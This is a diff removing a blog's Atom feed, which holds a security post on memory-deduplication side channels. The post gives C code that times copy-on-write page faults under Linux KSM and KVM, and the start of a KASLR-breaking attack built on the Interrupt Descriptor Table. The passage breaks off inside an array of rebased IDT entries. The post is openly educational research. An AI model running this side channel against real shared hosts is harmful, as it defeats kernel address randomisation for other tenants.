@@ -1,320 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://zolutal.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://zolutal.github.io/" rel="alternate" type="text/html" /><updated>2023-07-31T05:48:33+00:00</updated><id>https://zolutal.github.io/feed.xml</id><title type="html">zolutal’s blog</title><subtitle>systems hacking</subtitle><author><name>Justin Miller</name></author><entry><title type="html">Understanding Memory Deduplication Attacks</title><link href="https://zolutal.github.io/dedup-attacks/" rel="alternate" type="text/html" title="Understanding Memory Deduplication Attacks" /><published>2023-06-17T00:00:00+00:00</published><updated>2023-06-17T00:00:00+00:00</updated><id>https://zolutal.github.io/dedup-attacks</id><content type="html" xml:base="https://zolutal.github.io/dedup-attacks/"><![CDATA[<p>I recently came across a bunch of research describing attacks on memory deduplication, it has been used to fingerprint systems[1], crack (K)ASLR[2,3,4], leak database records[4], and even exploit rowhammer[5]. It’s a really cool class of attacks that I hadn’t heard of before, but I wasn’t having much luck finding any POCs for these attacks… So, I figured I’d write up what I learned about how these attacks work and write my own version of one of these attacks that can be used break KASLR in KVM for the current VM as well as across VMs.</p>
-
-<p><em>The ability to break KASLR across VMs while also bypassing KPTI using deduplication was discovered by the authors of [3], I will just be exploring the basis for these attacks and writing my own attack based on their research.</em></p>
-
-<p>A repository of the code examples associated with this post can be found here: <a href="https://github.com/zolutal/dedup-attacks">github.com/zolutal/dedup-attacks</a></p>
-
-<h2 id="wtf-is-deduplication">wtf is deduplication</h2>
-
-<p>Memory deduplication is an optimization to reduce the amount of memory being used on a system. The idea being that similar processes are likely to have similar memory contents, so by pointing pages of memory that have the same content to the same physical address and marking them copy-on-write a large amount of memory can be saved.</p>
-
-<p>Linux implements this via Kernel Same-Page Merging (KSM), which as the name implies “merges” pages with the same content by pointing them to the same physical memory. KSM will run periodically on a configurable interval, scanning a number of pages everytime for identical contents to merge.</p>
-
-<p>Note that KSM may not be enabled by default, though it was enabled on both of my Ubuntu 22.04 machines. Also, not every page is mergable, on Linux pages are only mergable if they are explicitly marked as mergable, e.g. using madvise with MADV_MERGABLE.</p>
-
-<p>Documentation regarding how to enable and configure KSM is located here: <a href="https://www.kernel.org/doc/html/v6.3/admin-guide/mm/ksm.html">Kernel Samepage Merging</a></p>
-
-<p>For reference, this was the default configuration for KSM on my Ubuntu machine:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/sys/kernel/mm/ksm/run:1
-/sys/kernel/mm/ksm/stable_node_chains_prune_millisecs:2000
-/sys/kernel/mm/ksm/merge_across_nodes:1
-/sys/kernel/mm/ksm/use_zero_pages:0
-/sys/kernel/mm/ksm/pages_to_scan:100
-/sys/kernel/mm/ksm/sleep_millisecs:200
-/sys/kernel/mm/ksm/use_zero_pages:0
-</code></pre></div></div>
-
-<h2 id="observing-deduplication">observing deduplication</h2>
-
-<p>As mentioned, when a page is merged it is made copy-on-write (CoW), in short this just means that it’s access permissions are set to be not writeable (write-protected) so that a page fault will occur if it is written to. When the kernel sees that a page fault occurred from an attempt to write to a copy-on-write page, it will copy the contents of the page to a newly allocated page and perform the write operation on the new page.</p>
-
-<p>So if we have a page that got deduplicated and we write to it, a page fault will occur. The page fault will have to be handled by the kernel which will have to identify the page fault was a write to a copy-on-write page, allocate a new page, copy the contents of the old page to the new one, and perform the write again all before returning to userspace. That’s a whole lot of stuff to do which will take way longer than a non-faulting memory write, meaning we can easily use a timer to record whether or not a write was a faulting one allowing us to detect if deduplication occurred on a given page.</p>
-
-<h3 id="timing-page-faults">timing page faults</h3>
-
-<p>Then the first step in exploiting deduplication is being able to detect when a page fault ocurrs. A simple way to demonstrate page fault detection is by using memory allocated using mmap. On Linux, the default behavior of mmap is to not immediately allocate the memory that is requested. This is because Linux implements demand paging, so pages aren’t allocated memory until they are first accessed. We can see this from the example below.</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// write a null byte to addr</span>
-<span class="kt">void</span> <span class="nf">poke</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="p">}</span>
-
-<span class="c1">// return the difference in the processor's timestamp before and after poke</span>
-<span class="kt">uint64_t</span> <span class="nf">time_poke</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">uint64_t</span> <span class="n">start</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
-    <span class="n">poke</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
-    <span class="kt">uint64_t</span> <span class="n">end</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
-    <span class="k">return</span> <span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="c1">// allocate a single read/write anon/private page</span>
-<span class="kt">void</span> <span class="o">*</span><span class="nf">alloc_page</span><span class="p">()</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANON</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kt">void</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
-
-    <span class="c1">// demonstrates that faulting accesses have distinct timings</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"fault     : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">));</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"post-fault: %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">));</span>
-<span class="p">}</span></code></pre></figure>
-
-<p>The timer isn’t particularly precise but it doesn’t really need to be because of how long page faults take, here is what I get running this code:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fault     : 7290 cycles
-post-fault: 108 cycles
-</code></pre></div></div>
-
-<p>Notice the first access took way longer, this is because as described previously the page wasn’t actually allocated until I attempted to access it. So when I wrote to it by calling poke a page fault occurred resulting in the kernel allocating memory for the page. Now when the second poke is timed the page is already allocated so the access occurs way faster and without a fault.</p>
-
-<h3 id="timing-un-merging">timing un-merging</h3>
-
-<p>Cool! So now let’s try to replicate this with madvise with MADV_MERGABLE.</p>
-
-<p>Pretty similar same setup besides the madvise and additional writes, just now we let the pages get merged and time the copy-on-write page fault instead of the demand paging page fault.</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">...</span>
-<span class="c1">// read a byte from addr</span>
-<span class="kt">void</span> <span class="nf">maccess</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span> <span class="p">}</span>
-
-<span class="c1">// time maccess using the processor timestamp</span>
-<span class="kt">uint64_t</span> <span class="nf">time_access</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">uint64_t</span> <span class="n">start</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
-    <span class="n">maccess</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
-    <span class="kt">uint64_t</span> <span class="n">end</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
-    <span class="k">return</span> <span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-    <span class="c1">// allocate victim and attacker pages</span>
-    <span class="kt">void</span> <span class="o">*</span><span class="n">victim</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
-    <span class="kt">void</span> <span class="o">*</span><span class="n">attacker</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
-
-    <span class="c1">// mark both pages as mergable</span>
-    <span class="n">madvise</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MADV_MERGEABLE</span><span class="p">);</span>
-    <span class="n">madvise</span><span class="p">(</span><span class="n">attacker</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MADV_MERGEABLE</span><span class="p">);</span>
-
-    <span class="c1">// write something unique to both pages so they aren't merged with</span>
-    <span class="c1">// other pages, this also faults them to be sure they are allocated</span>
-    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">victim</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
-    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">attacker</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">"sleeping to wait for merge...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-
-    <span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">"finished sleeping... checking access times</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"read  : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_access</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
-
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
-
-<p>And here is what the output looks like:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sleeping to wait for merge...
-finished sleeping... checking access times
-read  : 54 cycles
-write : 96768 cycles
-write : 54 cycles
-</code></pre></div></div>
-
-<p>The initial read is quick, meaning the page is present and hasn’t been swapped out or anything, but then the first write is extremely slow while the second write is quick. This result indicates that a page fault occurred on the first write due to the page having been merged, and the difference in timing for the pagefault was extremely distinct. So that now we know that we can observe memory deduplication let’s look at how to exploit it.</p>
-
-<h2 id="targeting-kvm">targeting KVM</h2>
-
-<p>Kernel Samepage Merging was originally designed with KVM in mind[7]. Though madvise exposes it to any application, KVM is still its main user and if it is enabled on the system qemu will use it by default.</p>
-
-<h3 id="making-sure-ksm-is-enabled-for-kvm">making sure KSM is enabled for KVM</h3>
-
-<p>To check if KSM is enabled on a system check the contents of /sys/kernel/mm/ksm/run, if this is set to ‘1’ then KSM is enabled.</p>
-
-<p>To check if KSM is enabled for qemu using KVM check the contents of /etc/default/qemu-kvm, if this is set to ‘AUTO’ or ‘1’ then memory for qemu VMs that use KVM will be made mergeable.</p>
-
-<h3 id="observing-deduplication-in-kvm">observing deduplication in KVM</h3>
-
-<p>Let’s confirm that deduplication is detectable in KVM with a similar setup. I booted up a Linux VM using qemu-system-x86_64 with ‘–enable-kvm’ and ‘-cpu host’ specified, and ran the following code.</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// allocate victim and attacker pages</span>
-<span class="kt">void</span> <span class="o">*</span><span class="n">victim</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
-<span class="kt">void</span> <span class="o">*</span><span class="n">attacker</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
-
-<span class="c1">// write something unique to both pages so they aren't merged with</span>
-<span class="c1">// other zero pages, this also faults them to be sure they are allocated</span>
-<span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">victim</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
-<span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">attacker</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
-
-<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"sleeping to wait for merge...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-
-    <span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">"finished sleeping... checking access times</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-
-    <span class="c1">// make sure attacker is present and in cache</span>
-    <span class="n">time_access</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
-<span class="p">}</span></code></pre></figure>
-
-<p>The only major differences between this test and the previous, aside from being inside a VM, are that the pages are no longer being marked mergeable using madvise, and the timing is wrapped in a loop (because the merging takes a bit longer with the amount of memory a VM uses).</p>
-
-<p>Here is an example of the output from this test:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
-sleeping to wait for merge...
-finished sleeping... checking access times
-write : 81 cycles
-write : 81 cycles
-sleeping to wait for merge...
-finished sleeping... checking access times
-write : 55242 cycles
-write : 54 cycles
-...
-</code></pre></div></div>
-
-<p>So without even marking either of these pages as mergeable, we can see that deduplication occurred!</p>
-
-<p>But this isn’t very interesting yet, all we’ve done is show that we can see our own memory get merged together…</p>
-
-<h3 id="breaking-kaslr">breaking KASLR</h3>
-
-<p>So how can we break KASLR using memory deduplication?</p>
-
-<p>The article describing this attack[2] targets relocations, the idea being that a number of instructions have to be adjusted after the kernel is rebased by KASLR, if we can find some code pages with only a few relocations then only the relocated instructions will differ between boot and leaking the relocated instructions will mean breaking KASLR. So if we just mmap a page in userspace with the contents of a kernel code page and bruteforce the relocations until merging occurs, we should have our leak!</p>
-
-<p>Except that sounds kind of annoying, adjusting relocations in C? maybe it isn’t actually <em>that</em> bad but I’d rather not… so I’ll target something else that’s a little more structured instead: the IDT.</p>
-
-<p>The Interrupt Descriptor Table (IDT) is a decent target for this attack because it is full of entries that represent interrupt entry points, the entries only vary per boot by KASLR affecting what address they will point to. This makes the entries relatively easy to generate, I can just boot the VM, dump the IDT to collect the first qword of the each entry, rebase them to according to the lowest possible virtual address for the kernel to be located, and stick them into an array. I’ll include a script I wrote in the repo that makes generating this array easy.</p>
-
-<p>For an IDT with entries that look like this:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/16gx 0xfffffe0000000000
-0xfffffe0000000000:	0x88808e0000100920	0x00000000ffffffff
-0xfffffe0000000010:	0x88808e0300100c40	0x00000000ffffffff
-0xfffffe0000000020:	0x88808e0200101680	0x00000000ffffffff
-0xfffffe0000000030:	0x8880ee0000100b30	0x00000000ffffffff
-0xfffffe0000000040:	0x8880ee0000100940	0x00000000ffffffff
-0xfffffe0000000050:	0x88808e0000100960	0x00000000ffffffff
-0xfffffe0000000060:	0x88808e0000100b10	0x00000000ffffffff
-0xfffffe0000000070:	0x88808e0000100980	0x00000000ffffffff
-</code></pre></div></div>
-
-<p>I end up with an array that looks like this:</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="n">entries</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x81208e0000100920</span><span class="p">,</span> <span class="mh">0x81208e0300100c40</span><span class="p">,</span> <span class="mh">0x81208e0200101680</span><span class="p">,</span> <span class="mh">0x8120ee0000100b30</span><span class="p">,</span> <span class="mh">0x8120ee0000100940</span><span class="p">,</span> <span class="mh">0x81208e0000100960</span><span class="p">,</span> <span class="mh">0x81208e0000100b10</span><span class="p">,</span> <span class="mh">0x81208e0000100980</span><span class="p">,</span> <span class="mh">0x81208e0100100ca0</span><span class="p">,</span> <span class="mh">0x81208e00001009a0</span><span class="p">,</span> <span class="mh">0x81208e0000100a20</span><span class="p">,</span> <span class="mh">0x81208e0000100a50</span><span class="p">,</span> <span class="mh">0x81208e0000100a80</span><span class="p">,</span> <span class="mh">0x81208e0000100ab0</span><span class="p">,</span> <span class="mh">0x81208e0000100b70</span><span class="p">,</span> <span class="mh">0x81208e00001009c0</span><span class="p">,</span> <span class="mh">0x81208e00001009e0</span><span class="p">,</span> <span class="mh">0x81208e0000100ae0</span><span class="p">,</span> <span class="mh">0x81208e0400100ba0</span><span class="p">,</span> <span class="mh">0x81208e0000100a00</span><span class="p">,</span> <span class="mh">0x81208e0000100db0</span><span class="p">,</span> <span class="mh">0x82678e000010992d</span><span class="p">,</span> <span class="mh">0x82678e0000109936</span><span class="p">,</span> <span class="mh">0x82678e000010993f</span><span class="p">,</span> <span class="mh">0x82678e0000109948</span><span class="p">,</span> <span class="mh">0x82678e0000109951</span><span class="p">,</span> <span class="mh">0x82678e000010995a</span><span class="p">,</span> <span class="mh">0x82678e0000109963</span><span class="p">,</span> <span class="mh">0x82678e000010996c</span><span class="p">,</span> <span class="mh">0x81208e0500100d00</span><span class="p">,</span> <span class="mh">0x82678e000010997e</span><span class="p">,</span> <span class="mh">0x82678e0000109987</span><span class="p">,</span> <span class="mh">0x81208e0000100f10</span><span class="p">,</span> <span class="mh">0x81208e0000100228</span><span class="p">,</span> <span class="mh">0x81208e0000100230</span><span class="p">,</span> <span class="mh">0x81208e0000100238</span><span class="p">,</span> <span class="mh">0x81208e0000100240</span><span class="p">,</span> <span class="mh">0x81208e0000100248</span><span class="p">,</span> <span class="mh">0x81208e0000100250</span><span class="p">,</span> <span class="mh">0x81208e0000100258</span><span class="p">,</span> <span class="mh">0x81208e0000100260</span><span class="p">,</span> <span class="mh">0x81208e0000100268</span><span class="p">,</span> <span class="mh">0x81208e0000100270</span><span class="p">,</span> <span class="mh">0x81208e0000100278</span><span class="p">,</span> <span class="mh">0x81208e0000100280</span><span class="p">,</span> <span class="mh">0x81208e0000100288</span><span class="p">,</span> <span class="mh">0x81208e0000100290</span><span class="p">,</span> <span class="mh">0x81208e0000100298</span><span class="p">,</span> <span class="mh">0x81208e00001002a0</span><span class="p">,</span> <span class="mh">0x81208e00001002a8</span><span class="p">,</span> <span class="mh">0x81208e00001002b0</span><span class="p">,</span> <span class="mh">0x81208e00001002b8</span><span class="p">,</span> <span class="mh">0x81208e00001002c0</span><span class="p">,</span> <span class="mh">0x81208e00001002c8</span><span class="p">,</span> <span class="mh">0x81208e00001002d0</span><span class="p">,</span> <span class="mh">0x81208e00001002d8</span><span class="p">,</span> <span class="mh">0x81208e00001002e0</span><span class="p">,</span> <span class="mh">0x81208e00001002e8</span><span class="p">,</span> <span class="mh">0x81208e00001002f0</span><span class="p">,</span> <span class="mh">0x81208e00001002f8</span><span class="p">,</span> <span class="mh">0x81208e0000100300</span><span class="p">,</span> <span class="mh">0x81208e0000100308</span><span class="p">,</span> <span class="mh">0x81208e0000100310</span><span class="p">,</span> <span class="mh">0x81208e0000100318</span><span class="p">,</span> <span class="mh">0x81208e0000100320</span><span class="p">,</span> <span class="mh">0x81208e0000100328</span><span class="p">,</span> <span class="mh">0x81208e0000100330</span><span class="p">,</span> <span class="mh">0x81208e0000100338</span><span class="p">,</span> <span class="mh">0x81208e0000100340</span><span class="p">,</span> <span class="mh">0x81208e0000100348</span><span class="p">,</span> <span class="mh">0x81208e0000100350</span><span class="p">,</span> <span class="mh">0x81208e0000100358</span><span class="p">,</span> <span class="mh">0x81208e0000100360</span><span class="p">,</span> <span class="mh">0x81208e0000100368</span><span class="p">,</span> <span class="mh">0x81208e0000100370</span><span class="p">,</span> <span class="mh">0x81208e0000100378</span><span class="p">,</span> <span class="mh">0x81208e0000100380</span><span class="p">,</span> <span class="mh">0x81208e0000100388</span><span class="p">,</span> <span class="mh">0x81208e0000100390</span><span class="p">,</span> <span class="mh">0x81208e0000100398</span><span class="p">,</span> <span class="mh">0x81208e00001003a0</span><span class="p">,</span> <span class="mh">0x81208e00001003a8</span><span class="p">,</span> <span class="mh">0x81208e00001003b0</span><span class="p">,</span> <span class="mh">0x81208e00001003b8</span><span class="p">,</span> <span class="mh">0x81208e00001003c0</span><span class="p">,</span> <span class="mh">0x81208e00001003c8</span><span class="p">,</span> <span class="mh">0x81208e00001003d0</span><span class="p">,</span> <span class="mh">0x81208e00001003d8</span><span class="p">,</span> <span class="mh">0x81208e00001003e0</span><span class="p">,</span> <span class="mh">0x81208e00001003e8</span><span class="p">,</span> <span class="mh">0x81208e00001003f0</span><span class="p">,</span> <span class="mh">0x81208e00001003f8</span><span class="p">,</span> <span class="mh">0x81208e0000100400</span><span class="p">,</span> <span class="mh">0x81208e0000100408</span><span class="p">,</span> <span class="mh">0x81208e0000100410</span><span class="p">,</span> <span class="mh">0x81208e0000100418</span><span class="p">,</span> <span class="mh">0x81208e0000100420</span><span class="p">,</span> <span class="mh">0x81208e0000100428</span><span class="p">,</span> <span class="mh">0x81208e0000100430</span><span class="p">,</span> <span class="mh">0x81208e0000100438</span><span class="p">,</span> <span class="mh">0x81208e0000100440</span><span class="p">,</span> <span class="mh">0x81208e0000100448</span><span class="p">,</span> <span class="mh">0x81208e0000100450</span><span class="p">,</span> <span class="mh">0x81208e0000100458</span><span class="p">,</span> <span class="mh">0x81208e0000100460</span><span class="p">,</span> <span class="mh">0x81208e0000100468</span><span class="p">,</span> <span class="mh">0x81208e0000100470</span><span class="p">,</span> <span class="mh">0x81208e0000100478</span><span class="p">,</span> <span class="mh">0x81208e0000100480</span><span class="p">,</span> <span class="mh">0x81208e0000100488</span><span class="p">,</span> <span class="mh">0x81208e0000100490</span><span class="p">,</span> <span class="mh">0x81208e0000100498</span><span class="p">,</span> <span class="mh">0x81208e00001004a0</span><span class="p">,</span> <span class="mh">0x81208e00001004a8</span><span class="p">,</span> <span class="mh">0x81208e00001004b0</span><span class="p">,</span> <span class="mh">0x81208e00001004b8</span><span class="p">,</span> <span class="mh">0x81208e00001004c0</span><span class="p">,</span> <span class="mh">0x81208e00001004c8</span><span class="p">,</span> <span class="mh">0x81208e00001004d0</span><span class="p">,</span> <span class="mh">0x81208e00001004d8</span><span class="p">,</span> <span class="mh">0x81208e00001004e0</span><span class="p">,</span> <span class="mh">0x81208e00001004e8</span><span class="p">,</span> <span class="mh">0x81208e00001004f0</span><span class="p">,</span> <span class="mh">0x81208e00001004f8</span><span class="p">,</span> <span class="mh">0x81208e0000100500</span><span class="p">,</span> <span class="mh">0x81208e0000100508</span><span class="p">,</span> <span class="mh">0x81208e0000100510</span><span class="p">,</span> <span class="mh">0x81208e0000100518</span><span class="p">,</span> <span class="mh">0x8120ee0000101a80</span><span class="p">,</span> <span class="mh">0x81208e0000100528</span><span class="p">,</span> <span class="mh">0x81208e0000100530</span><span class="p">,</span> <span class="mh">0x81208e0000100538</span><span class="p">,</span> <span class="mh">0x81208e0000100540</span><span class="p">,</span> <span class="mh">0x81208e0000100548</span><span class="p">,</span> <span class="mh">0x81208e0000100550</span><span class="p">,</span> <span class="mh">0x81208e0000100558</span><span class="p">,</span> <span class="mh">0x81208e0000100560</span><span class="p">,</span> <span class="mh">0x81208e0000100568</span><span class="p">,</span> <span class="mh">0x81208e0000100570</span><span class="p">,</span> <span class="mh">0x81208e0000100578</span><span class="p">,</span> <span class="mh">0x81208e0000100580</span><span class="p">,</span> <span class="mh">0x81208e0000100588</span><span class="p">,</span> <span class="mh">0x81208e0000100590</span><span class="p">,</span> <span class="mh">0x81208e0000100598</span><span class="p">,</span> <span class="mh">0x81208e00001005a0</span><span class="p">,</span> <span class="mh">0x81208e00001005a8</span><span class="p">,</span> <span class="mh">0x81208e00001005b0</span><span class="p">,</span> <span class="mh">0x81208e00001005b8</span><span class="p">,</span> <span class="mh">0x81208e00001005c0</span><span class="p">,</span> <span class="mh">0x81208e00001005c8</span><span class="p">,</span> <span class="mh">0x81208e00001005d0</span><span class="p">,</span> <span class="mh">0x81208e00001005d8</span><span class="p">,</span> <span class="mh">0x81208e00001005e0</span><span class="p">,</span> <span class="mh">0x81208e00001005e8</span><span class="p">,</span> <span class="mh">0x81208e00001005f0</span><span class="p">,</span> <span class="mh">0x81208e00001005f8</span><span class="p">,</span> <span class="mh">0x81208e0000100600</span><span class="p">,</span> <span class="mh">0x81208e0000100608</span><span class="p">,</span> <span class="mh">0x81208e0000100610</span><span class="p">,</span> <span class="mh">0x81208e0000100618</span><span class="p">,</span> <span class="mh">0x81208e0000100620</span><span class="p">,</span> <span class="mh">0x81208e0000100628</span><span class="p">,</span> <span class="mh">0x81208e0000100630</span><span class="p">,</span> <span class="mh">0x81208e0000100638</span><span class="p">,</span> <span class="mh">0x81208e0000100640</span><span class="p">,</span> <span class="mh">0x81208e0000100648</span><span class="p">,</span> <span class="mh">0x81208e0000100650</span><span class="p">,</span> <span class="mh">0x81208e0000100658</span><span class="p">,</span> <span class="mh">0x81208e0000100660</span><span class="p">,</span> <span class="mh">0x81208e0000100668</span><span class="p">,</span> <span class="mh">0x81208e0000100670</span><span class="p">,</span> <span class="mh">0x81208e0000100678</span><span class="p">,</span> <span class="mh">0x81208e0000100680</span><span class="p">,</span> <span class="mh">0x81208e0000100688</span><span class="p">,</span> <span class="mh">0x81208e0000100690</span><span class="p">,</span> <span class="mh">0x81208e0000100698</span><span class="p">,</span> <span class="mh">0x81208e00001006a0</span><span class="p">,</span> <span class="mh">0x81208e00001006a8</span><span class="p">,</span> <span class="mh">0x81208e00001006b0</span><span class="p">,</span> <span class="mh">0x81208e00001006b8</span><span class="p">,</span> <span class="mh">0x81208e00001006c0</span><span class="p">,</span> <span class="mh">0x81208e00001006c8</span><span class="p">,</span> <span class="mh">0x81208e00001006d0</span><span class="p">,</span> <span class="mh">0x81208e00001006d8</span><span class="p">,</span> <span class="mh">0x81208e00001006e0</span><span class="p">,</span> <span class="mh">0x81208e00001006e8</span><span class="p">,</span> <span class="mh">0x81208e00001006f0</span><span class="p">,</span> <span class="mh">0x81208e00001006f8</span><span class="p">,</span> <span class="mh">0x81208e0000100700</span><span class="p">,</span> <span class="mh">0x81208e0000100708</span><span class="p">,</span> <span class="mh">0x81208e0000100710</span><span class="p">,</span> <span class="mh">0x81208e0000100718</span><span class="p">,</span> <span class="mh">0x81208e0000100720</span><span class="p">,</span> <span class="mh">0x81208e0000100728</span><span class="p">,</span> <span class="mh">0x81208e0000100730</span><span class="p">,</span> <span class="mh">0x81208e0000100738</span><span class="p">,</span> <span class="mh">0x81208e0000100740</span><span class="p">,</span> <span class="mh">0x81208e0000100748</span><span class="p">,</span> <span class="mh">0x81208e0000100750</span><span class="p">,</span> <span class="mh">0x81208e0000100758</span><span class="p">,</span> <span class="mh">0x81208e0000100760</span><span class="p">,</span> <span class="mh">0x81208e0000100768</span><span class="p">,</span> <span class="mh">0x81208e0000100770</span><span class="p">,</span> <span class="mh">0x81208e0000100778</span><span class="p">,</span> <span class="mh">0x81208e0000100780</span><span class="p">,</span> <span class="mh">0x81208e0000100788</span><span class="p">,</span> <span class="mh">0x81208e0000100790</span><span class="p">,</span> <span class="mh">0x81208e0000100798</span><span class="p">,</span> <span class="mh">0x81208e00001007a0</span><span class="p">,</span> <span class="mh">0x81208e00001007a8</span><span class="p">,</span> <span class="mh">0x81208e00001007b0</span><span class="p">,</span> <span class="mh">0x81208e00001007b8</span><span class="p">,</span> <span class="mh">0x81208e00001007c0</span><span class="p">,</span> <span class="mh">0x81208e00001007c8</span><span class="p">,</span> <span class="mh">0x81208e00001007d0</span><span class="p">,</span> <span class="mh">0x81208e00001007d8</span><span class="p">,</span> <span class="mh">0x81208e00001007e0</span><span class="p">,</span> <span class="mh">0x81208e00001007e8</span><span class="p">,</span> <span class="mh">0x81208e00001007f0</span><span class="p">,</span> <span class="mh">0x81208e00001007f8</span><span class="p">,</span> <span class="mh">0x81208e0000100800</span><span class="p">,</span> <span class="mh">0x81208e0000100808</span><span class="p">,</span> <span class="mh">0x81208e0000100810</span><span class="p">,</span> <span class="mh">0x81208e0000100818</span><span class="p">,</span> <span class="mh">0x81208e0000100820</span><span class="p">,</span> <span class="mh">0x81208e0000100828</span><span class="p">,</span> <span class="mh">0x81208e0000100830</span><span class="p">,</span> 